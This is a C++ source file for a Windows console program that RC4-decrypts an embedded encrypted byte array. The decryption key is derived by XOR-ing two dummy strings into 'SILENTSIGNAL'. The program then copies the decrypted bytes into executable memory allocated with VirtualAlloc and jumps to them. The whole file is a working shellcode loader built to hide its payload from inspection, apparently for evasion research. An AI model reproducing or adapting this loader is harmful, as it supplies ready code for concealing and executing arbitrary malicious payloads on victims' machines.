// sheep.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<Windows.h>
#include<string.h>
#include "common.h"
#include "rc4.h"
#define SWAP(x, y, T) do { T SWAP = x; x = y; y = SWAP; } while (0)

void rc4_set_key(const unsigned char *buf, size_t len, rc4_key_t * key)
{
        unsigned char j = 0;
        unsigned char *state = key->state;
        int i;

        for (i = 0;  i < 256; ++i)
                state[i] = i;

        key->x = 0;
        key->y = 0;

        for (i = 0; i < 256; ++i) {
                j = j + state[i] + buf[i % len];
                SWAP(state[i], state[j],unsigned char);
        }
}

void rc4_crypt(unsigned char *buf, size_t len, rc4_key_t * key)
{
        unsigned char x;
        unsigned char y;
        unsigned char *state = key->state;
        unsigned int  i;

        x = key->x;
        y = key->y;

        for (i = 0; i < len; i++) {
                y = y + state[++x];
                SWAP(state[x], state[y],unsigned char);
                buf[i] ^= state[(state[x] + state[y]) & 0xff];
        }

        key->x = x;
        key->y = y;
}


#define DUMMY "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

int angel();
int devil();

char *dummya = DUMMY "A";
char *dummyb = DUMMY "B";
unsigned char code[]="\x97\x03\x9d\x4e\xb0\x98\xb7\x33\x45\x50\x10\x5e\xa6\xe1\xc1\x7e\x54"
"\xb6\x1c\x8e\xa5\x4d\x56\x97\x6f\x81\xfc\x17\x93\x0b\x20\x93\x8c\x56\xb5\x03\xac"
"\x72\x86\xf6\xa3\x31\x16\x69\x41\xd6\x48\x14\xc0\x5e\x29\xa4\xbf\x4c\xb8\xa3\x1d"
"\xb2\x15\xbf\xf0\xad\x7c\xf7\x7f\xa1\x46\xe8\x00\x21\xdb\xab\xc9\xfb\xa5\xe0\xb6"
"\xfa\x05\xbe\x62\x65\xed\x2e\x77\x53\x45\x9a\x51\xd5\x24\x56\x34\xcb\x83\xa1\x0f"
"\xc1\x52\x6e\x44\xc9\x83\xb4\xb3\xce\xc7\x63\x8e\x00\xec\x15\x03\x5f\x5c\x00\x8b"
"\xad\xfa\xc8\x13\x4a\x8b\x4d\x0c\xd3\x3c\x69\xc5\xdc\x24\xf5\x2f\x44\x4e\x17\x40"
"\xeb\x27\xcd\xaf\xca\x90\x15\x8a\xce\x08\x2d\xda\x5e\xcc\x91\xc6\x19\xba\x82\x92"
"\xdf\x8b\xd3\xd0\x3a\xfc\x6a\x9f\x81\xfb\xc7\x4c\x44\xe0\x0c\x8d\xbc\x57\xbb\x15"
"\x35\xfb\x48\x4a\x0c\x3b\x39\xec\x64\xa4\x77\x93\x17\x97\xa8\x24\xdf\x4c\x8d\x29"
"\xa4\x37\x4d\x47\x9d\xab\xfa\x38\x50\x11\x53\x74\xaf\x19\x3e\xf2\xf5\xc0\xef\xdd"
"\x6e\x3e\x25\xfa\x6c\x92\xbf\x5b\xc2\x00\x6c\x76\x9e\xd3\x55\x64\x38\xfe\x51\xe9"
"\x41\x56\x26\x25\xf4\x3c\x27\x86\x58\x1e\xf6\x5d\x42\x90\x2c\x7f\xc7\xdd\x71\xaf"
"\x25\x1d\xd7\xde\x85\xa7\xf3\x16\x75\x39\x5c\x64\x94\xee\x8d\x9c";
int _tmain(int argc, _TCHAR* argv[])
{


	unsigned char key[]="SILENTSIGNAL";
	char* dummya_c=dummya;
	char* dummyb_c=dummyb;

	for (int i=0;i<strlen(dummya);i++){
		key[i%strlen((char*)key)]^=dummya_c[i]^dummyb_c[i];
	}
	printf("%s",key);
	rc4_key_t rc4_key;
	rc4_set_key(key,strlen((const char*)key),&rc4_key);
	unsigned char crypted[sizeof(code)];
	rc4_crypt(crypted,sizeof(crypted),&rc4_key);
	for (int i=0;i<sizeof(code);i++){
		code[i]^=crypted[i];
		printf("\\x%02x",code[i]);
	}
	printf("DONE");
	void* p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(p,code,sizeof(code));
	((void(*)())p)();
}




